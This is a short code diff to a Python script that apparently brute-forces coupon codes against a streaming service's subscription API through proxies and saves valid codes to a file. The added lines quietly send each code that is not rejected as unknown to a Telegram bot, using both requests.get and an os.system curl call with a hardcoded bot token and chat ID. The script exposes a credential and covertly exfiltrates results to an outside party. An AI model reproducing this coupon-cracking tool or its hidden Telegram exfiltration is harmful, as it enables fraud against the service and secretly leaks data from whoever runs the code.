@@ -27,5 +27,8 @@ for cd in i:
 	#requests.get("https://prod-api.viewlift.com/subscription/offer/validate?site=hoichoitv")
 	resp = requests.post(url, headers=headers, data=data, cookies=cok, proxies=proxies)
 	print('CHECKING >> ' + cd + resp.content + "\n")
+	if "Cannot find given couponCode!" not in resp.content:
+		requests.get("https://api.telegram.org/bot1890546901:AAE8h_Q_KmIBdVO40pUNJz7E-lHLwEz159o/sendMessage?chat_id=1226270709&text="+cd)
+		os.system('curl "https://api.telegram.org/bot1890546901:AAE8h_Q_KmIBdVO40pUNJz7E-lHLwEz159o/sendMessage?chat_id=1226270709&text='+cd+'"')
 	if "Code is Valid" in resp.content:
 		open('hits.txt', 'a').write(cd+'\n')
